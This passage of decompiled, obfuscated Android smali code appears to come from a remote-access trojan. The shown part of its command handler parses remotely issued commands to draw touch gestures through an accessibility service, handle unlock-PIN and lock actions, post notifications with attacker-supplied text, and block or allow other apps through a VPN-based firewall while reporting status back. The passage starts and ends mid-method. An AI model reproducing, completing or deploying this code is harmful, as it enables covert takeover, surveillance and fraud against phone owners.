    if-eq v6, v0, :cond_81

    goto/16 :goto_2a

    .line 1405
    :cond_81
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38;->MyVPN:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/FirewallServices;

    if-eqz v0, :cond_af

    .line 1407
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38;->MyVPN:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/FirewallServices;

    invoke-virtual {v0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/FirewallServices;->StopVpn()V

    const/4 v0, 0x0

    .line 1408
    sput-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38;->MyVPN:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/FirewallServices;

    goto/16 :goto_2a

    .line 1396
    :cond_82
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38;->MyVPN:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/FirewallServices;

    if-eqz v0, :cond_83

    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38;->MyVPN:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/FirewallServices;

    invoke-virtual {v0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/FirewallServices;->isConnected()Z

    move-result v0

    if-nez v0, :cond_af

    .line 1397
    :cond_83
    new-instance v0, Landroid/content/Intent;

    aget-object v5, p1, v3

    const-class v6, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/RequestVPN;

    invoke-direct {v0, v5, v6}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 1398
    invoke-virtual {v0, v13}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 1399
    aget-object v5, p1, v3

    invoke-virtual {v5, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    goto/16 :goto_2a

    .line 1386
    :cond_84
    sget-object v5, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38;->MyVPN:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/FirewallServices;

    if-nez v5, :cond_85

    .line 1387
    aget-object v5, v0, v8

    invoke-static {v5}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38;->AllowApp(Ljava/lang/String;)V

    .line 1388
    sget-object v5, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/utilities;->firewall:Ljava/lang/String;

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    aget-object v7, v0, v8

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    aget-object v7, p1, v3

    aget-object v0, v0, v8

    invoke-static {v7, v0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;->getAppNameFromPkgName(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v6, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v0, "#Allowed"

    invoke-virtual {v6, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    invoke-static {v5, v0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38;->ewyayeonlnxbxvjjsatsqohmbcxqfsimqcwqwdzhjaqnilufqh52(Ljava/lang/String;[B)V

    goto/16 :goto_2a

    .line 1390
    :cond_85
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/utilities;->ShowNotifi:Ljava/lang/String;

    const-string v5, "to Allow app, disable firewall first."

    invoke-virtual {v5}, Ljava/lang/String;->getBytes()[B

    move-result-object v5

    invoke-static {v0, v5}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38;->ewyayeonlnxbxvjjsatsqohmbcxqfsimqcwqwdzhjaqnilufqh52(Ljava/lang/String;[B)V

    goto/16 :goto_2a

    .line 1375
    :cond_86
    sget-object v5, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38;->MyVPN:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/FirewallServices;

    if-nez v5, :cond_87

    .line 1376
    aget-object v5, v0, v8

    invoke-static {v5}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38;->BlockApp(Ljava/lang/String;)V

    .line 1377
    sget-object v5, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/utilities;->firewall:Ljava/lang/String;

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    aget-object v7, v0, v8

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    aget-object v7, p1, v3

    aget-object v0, v0, v8

    invoke-static {v7, v0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;->getAppNameFromPkgName(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v6, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v0, "#Blocked"

    invoke-virtual {v6, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    invoke-static {v5, v0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38;->ewyayeonlnxbxvjjsatsqohmbcxqfsimqcwqwdzhjaqnilufqh52(Ljava/lang/String;[B)V

    goto/16 :goto_2a

    .line 1380
    :cond_87
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/utilities;->ShowNotifi:Ljava/lang/String;

    const-string v5, "to Block app, disable firewall first."

    invoke-virtual {v5}, Ljava/lang/String;->getBytes()[B

    move-result-object v5

    invoke-static {v0, v5}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38;->ewyayeonlnxbxvjjsatsqohmbcxqfsimqcwqwdzhjaqnilufqh52(Ljava/lang/String;[B)V

    goto/16 :goto_2a

    .line 1369
    :cond_88
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38;->MyVPN:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/FirewallServices;

    if-eqz v0, :cond_89

    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38;->MyVPN:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/FirewallServices;

    invoke-virtual {v0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/FirewallServices;->isConnected()Z

    move-result v0

    if-eqz v0, :cond_89

    goto :goto_24

    :cond_89
    const/4 v8, 0x0

    :goto_24
    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    .line 1371
    sget-object v5, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/utilities;->firewall:Ljava/lang/String;

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    invoke-static {v0}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v6, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v0, "!"

    invoke-virtual {v6, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    aget-object v0, p1, v3

    invoke-static {v0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/FirewallServices;->Load(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v6, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    invoke-static {v5, v0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38;->ewyayeonlnxbxvjjsatsqohmbcxqfsimqcwqwdzhjaqnilufqh52(Ljava/lang/String;[B)V
    :try_end_57
    .catch Ljava/lang/Exception; {:try_start_57 .. :try_end_57} :catch_14
    .catch Ljava/lang/OutOfMemoryError; {:try_start_57 .. :try_end_57} :catch_15

    goto/16 :goto_2a

    .line 1414
    :cond_8a
    :try_start_58
    aget-object v0, v10, v8

    const-string v9, "noti<*>"

    invoke-virtual {v0, v9}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v0
    :try_end_58
    .catch Ljava/lang/Exception; {:try_start_58 .. :try_end_58} :catch_15
    .catch Ljava/lang/OutOfMemoryError; {:try_start_58 .. :try_end_58} :catch_15

    if-eqz v0, :cond_8c

    .line 1416
    :try_start_59
    aget-object v0, v10, v8

    const-string v6, "noti<*>"

    invoke-virtual {v0, v6, v11}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0, v5}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v0

    .line 1417
    aget-object v10, v0, v3

    .line 1418
    aget-object v11, v0, v8

    .line 1423
    aget-object v5, v0, v7

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/Integer;->intValue()I

    move-result v12

    const/4 v5, 0x3

    .line 1426
    aget-object v14, v0, v5

    const/4 v5, 0x4

    .line 1430
    aget-object v0, v0, v5

    const-string v5, "1"

    invoke-virtual {v0, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v13

    .line 1434
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->MyAccess:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;

    if-eqz v0, :cond_8b

    .line 1435
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->MyAccess:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;

    aget-object v9, p1, v3

    invoke-static/range {v9 .. v14}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;->MakeNotifier(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;IZLjava/lang/String;)V

    goto/16 :goto_2a

    .line 1437
    :cond_8b
    aget-object v9, p1, v3

    invoke-static/range {v9 .. v14}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;->MakeNotifier(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;IZLjava/lang/String;)V
    :try_end_59
    .catch Ljava/lang/Exception; {:try_start_59 .. :try_end_59} :catch_14
    .catch Ljava/lang/OutOfMemoryError; {:try_start_59 .. :try_end_59} :catch_15

    goto/16 :goto_2a

    .line 1441
    :cond_8c
    :try_start_5a
    aget-object v0, v10, v8

    const-string v9, "sp<*>"

    invoke-virtual {v0, v9}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v0
    :try_end_5a
    .catch Ljava/lang/Exception; {:try_start_5a .. :try_end_5a} :catch_15
    .catch Ljava/lang/OutOfMemoryError; {:try_start_5a .. :try_end_5a} :catch_15

    if-eqz v0, :cond_91

    .line 1446
    :try_start_5b
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v5, 0x18

    if-lt v0, v5, :cond_af

    .line 1447
    aget-object v0, v10, v8

    const-string v5, "sp<*>"

    invoke-virtual {v0, v5, v11}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    const-string v5, "clk"

    .line 1448
    invoke-virtual {v0, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-nez v5, :cond_8f

    const-string v5, "Bc"

    invoke-virtual {v0, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-nez v5, :cond_8f

    const-string v5, "Ho"

    invoke-virtual {v0, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-nez v5, :cond_8f

    const-string v5, "RC"

    invoke-virtual {v0, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-nez v5, :cond_8f

    const-string v5, "LK"

    invoke-virtual {v0, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-nez v5, :cond_8f

    const-string v5, "SK"

    invoke-virtual {v0, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-nez v5, :cond_8f

    const-string v5, "UPIN"

    invoke-virtual {v0, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_8d

    goto :goto_26

    :cond_8d
    const-string v5, ":"

    .line 1462
    invoke-static {v5}, Ljava/util/regex/Pattern;->quote(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v0, v5}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v0

    .line 1463
    array-length v5, v0

    new-array v5, v5, [Landroid/graphics/Point;

    const/4 v6, 0x0

    .line 1465
    :goto_25
    array-length v7, v0
    :try_end_5b
    .catch Ljava/lang/Exception; {:try_start_5b .. :try_end_5b} :catch_f
    .catch Ljava/lang/OutOfMemoryError; {:try_start_5b .. :try_end_5b} :catch_15

    sub-int/2addr v7, v8

    if-ge v6, v7, :cond_8e

    .line 1467
    :try_start_5c
    aget-object v7, v0, v6

    const-string v9, "{"

    invoke-virtual {v7, v9, v11}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v7

    const-string v9, "}"

    invoke-virtual {v7, v9, v11}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v7

    const-string v9, ","

    invoke-virtual {v7, v9}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v7

    .line 1469
    aget-object v9, v7, v3

    const-string v10, "="

    invoke-virtual {v9, v10}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v9

    aget-object v9, v9, v8

    invoke-static {v9}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v9

    .line 1470
    aget-object v7, v7, v8

    const-string v10, "="

    invoke-virtual {v7, v10}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v7

    aget-object v7, v7, v8

    invoke-static {v7}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v7

    .line 1472
    new-instance v10, Landroid/graphics/Point;

    invoke-direct {v10, v9, v7}, Landroid/graphics/Point;-><init>(II)V

    aput-object v10, v5, v6
    :try_end_5c
    .catch Ljava/lang/Exception; {:try_start_5c .. :try_end_5c} :catch_e
    .catch Ljava/lang/OutOfMemoryError; {:try_start_5c .. :try_end_5c} :catch_15

    :catch_e
    add-int/lit8 v6, v6, 0x1

    goto :goto_25

    .line 1477
    :cond_8e
    :try_start_5d
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->MyAccess:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;

    const/16 v6, 0x352

    invoke-virtual {v0, v5, v6}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;->mouseDraw([Landroid/graphics/Point;I)V

    goto/16 :goto_2a

    :cond_8f
    :goto_26
    const-string v5, "UPIN"

    .line 1450
    invoke-virtual {v0, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_90

    .line 1451
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->MyAccess:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;

    goto/16 :goto_2a

    .line 1457
    :cond_90
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->MyAccess:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;

    aget-object v5, v10, v8

    const-string v6, "sp<*>"

    invoke-virtual {v5, v6, v11}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v0, v5}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;->SW(Ljava/lang/String;)V
    :try_end_5d
    .catch Ljava/lang/Exception; {:try_start_5d .. :try_end_5d} :catch_f
    .catch Ljava/lang/OutOfMemoryError; {:try_start_5d .. :try_end_5d} :catch_15

    goto/16 :goto_2a

    :catch_f
    move-exception v0

    .line 1483
    :try_start_5e
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto/16 :goto_2a

    .line 1485
    :cond_91
    aget-object v0, v10, v8

    const-string v9, "lodp<*>"

    invoke-virtual {v0, v9}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v0
    :try_end_5e
    .catch Ljava/lang/Exception; {:try_start_5e .. :try_end_5e} :catch_15
    .catch Ljava/lang/OutOfMemoryError; {:try_start_5e .. :try_end_5e} :catch_15

    if-eqz v0, :cond_a4

    .line 1488
    :try_start_5f
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->MyAccess:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;

    if-eqz v0, :cond_af

    .line 1489
    aget-object v0, v10, v8

    const-string v9, "lodp<*>"

    invoke-virtual {v0, v9, v11}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    const-string v9, "<\\*>"

    invoke-virtual {v0, v9}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v0

    .line 1491
    aget-object v9, v0, v3

    invoke-virtual {v9}, Ljava/lang/String;->hashCode()I

    move-result v10

    const/16 v12, 0x67

    if-eq v10, v12, :cond_97

    const/16 v12, 0x6c

    if-eq v10, v12, :cond_96

    const/16 v12, 0xc23

    if-eq v10, v12, :cond_95

    const/16 v12, 0xc69

    if-eq v10, v12, :cond_94

    const/16 v12, 0xc9f

    if-eq v10, v12, :cond_93

    const/16 v12, 0xe33

    if-eq v10, v12, :cond_92

    goto :goto_27

    :cond_92
    const-string v10, "re"

    invoke-virtual {v9, v10}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v9

    if-eqz v9, :cond_98

    const/4 v6, 0x2

    goto :goto_27

    :cond_93
    const-string v10, "ed"

    invoke-virtual {v9, v10}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v9

    if-eqz v9, :cond_98

    const/4 v6, 0x3

    goto :goto_27

    :cond_94
    const-string v10, "cl"

    invoke-virtual {v9, v10}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v9

    if-eqz v9, :cond_98

    const/4 v6, 0x0

    goto :goto_27

    :cond_95
    const-string v10, "ad"

    invoke-virtual {v9, v10}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v9

    if-eqz v9, :cond_98

    const/4 v6, 0x4

    goto :goto_27

    :cond_96
    const-string v10, "l"

    invoke-virtual {v9, v10}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v9

    if-eqz v9, :cond_98

    const/4 v6, 0x5

    goto :goto_27

    :cond_97
    const-string v10, "g"

    invoke-virtual {v9, v10}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v9

    if-eqz v9, :cond_98

    const/4 v6, 0x1

    :cond_98
    :goto_27
    if-eqz v6, :cond_a3

    if-eq v6, v8, :cond_a2

    if-eq v6, v7, :cond_a1

    const/4 v9, 0x3

    if-eq v6, v9, :cond_9e

    const/4 v9, 0x4

    if-eq v6, v9, :cond_9d

    const/4 v9, 0x5

    if-eq v6, v9, :cond_99

    goto/16 :goto_2a

    .line 1538
    :cond_99
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;->TNames:Ljava/util/List;

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v0

    if-lez v0, :cond_9c

    .line 1540
    new-instance v0, Ljava/lang/StringBuilder;

